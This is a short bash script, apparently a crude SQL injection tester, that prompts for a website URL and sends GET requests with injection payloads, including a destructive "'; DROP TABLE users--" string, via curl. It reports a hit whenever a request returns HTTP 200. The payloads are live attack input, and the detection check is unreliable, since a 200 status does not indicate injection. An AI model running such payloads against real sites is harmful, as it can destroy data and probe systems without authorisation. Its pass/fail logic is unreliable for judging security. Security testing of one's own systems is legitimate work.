#!/bin/bash

# Prompt the user for the website URL
read -p "Enter the website URL to test (e.g., https://website.com): " URL

# List of SQL injection payloads to test
SQL_INJECTION_PAYLOADS=(
  "' OR '1'='1"       # Basic payload
  "'; DROP TABLE users--" # SQL injection with malicious intent (for testing only)
  # Add more payloads here
)

for PAYLOAD in "${SQL_INJECTION_PAYLOADS[@]}"; do
  # Send a GET request with the payload
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$URL/?param=$PAYLOAD")

  # Check if the response indicates a potential SQL injection
  if [ "$RESPONSE" == "200" ]; then
    echo "Potential SQL Injection: $URL/?param=$PAYLOAD"
  fi
done
